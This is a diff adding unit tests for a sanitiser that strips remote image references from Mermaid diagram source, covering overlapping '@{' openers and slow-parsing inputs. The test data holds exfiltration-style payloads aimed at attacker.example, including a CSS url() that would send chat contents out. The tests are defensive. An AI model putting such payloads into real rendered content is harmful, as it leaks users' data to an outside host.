@@ -107,6 +107,25 @@ test("two readings of `@{` that overlap are both made inert, keeping the text", 
   assert.equal(stripRemoteDiagramImages(out), out);
 });
 
+test("an overlap makes only its own openers inert, a separate block is still rewritten", () => {
+  const source =
+    'flowchart LR\n  A["show @{ img: @{ img: x }"] --> B@{ img: "https://attacker.example/x", label: "B" }';
+  const out = stripRemoteDiagramImages(source);
+  assert.equal(out, 'flowchart LR\n  A["show #64;{ img: #64;{ img: x }"] --> B@{ "label":"B" }');
+  assert.equal(stripRemoteDiagramImages(out), out);
+});
+
+test("many `@{` sharing one close are not each parsed to the end", () => {
+  for (const filler of ["@{ # ", "@{ # img "]) {
+    const source = `sequenceDiagram\nAlice->>Bob: ${filler.repeat(32000)}}\nBob->>Alice: B@{ img: https://attacker.example/x }`;
+    const started = performance.now();
+    const out = stripRemoteDiagramImages(source);
+    assert.ok(performance.now() - started < 1000, `${filler}: ${performance.now() - started} ms`);
+    // The remote image is taken out, or every opener is made inert.
+    assert.equal(out.includes("attacker.example") && out.includes("@{"), false);
+  }
+});
+
 test("a style statement after a semicolon cannot fetch either", () => {
   const url = "url(https://attacker.example/collect?chat=secret)";
   for (const [source, kept] of [
